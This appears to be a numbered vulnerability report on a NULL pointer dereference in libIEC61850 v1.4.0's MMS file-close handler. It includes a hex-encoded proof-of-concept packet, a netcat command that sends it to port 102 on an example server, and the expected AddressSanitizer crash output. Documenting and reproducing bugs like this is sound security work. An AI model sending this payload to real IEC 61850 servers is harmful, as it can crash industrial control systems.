Number: 496

Summarize:
libIEC61850 v1.4.0 and earlier release contains a NULL pointer dereference in `mmsServer_handleFileCloseRequest` in `src/mms/iso_mms/server/mms_file_service.c`. In the provided reproduction, sending the supplied PoC to the `server_example_substitution` example on port 102 causes a SEGV during request parsing, and AddressSanitizer reports a READ from address `0x000000000010` with the top frame at `src/mms/iso_mms/server/mms_file_service.c:860`. The demonstrated impact is application crash/abort.

Reproduce:
Environment: Ubuntu 18.04; libIEC61850 v1.4.0 example `examples/server_example_substitution`.
1. Change to `path/to/libiec61850-v1.4.0/examples/server_example_substitution`.
2. Start the server example: `sudo ./server_example_substitution`.
3. Use the source's `poc` data (`0300004002F0800100010061333031020100A02CA02A02020089A4007F4A01A11FA01D301BA019A1171A0B54454D504C4154454C44301A085350565433244D58`) and send it as documented with `cat poc | nc 0.0.0.0 102`.
4. Expected result: the server prints `Using libIEC61850 version 1.4.0` and `Connection opened`, then aborts with `ASAN:DEADLYSIGNAL`. AddressSanitizer reports `ERROR: AddressSanitizer: SEGV on unknown address 0x000000000010` caused by a READ access, with the top frame `mmsServer_handleFileCloseRequest src/mms/iso_mms/server/mms_file_service.c:860`, and the summary `AddressSanitizer: SEGV src/mms/iso_mms/server/mms_file_service.c:860 in mmsServer_handleFileCloseRequest`.
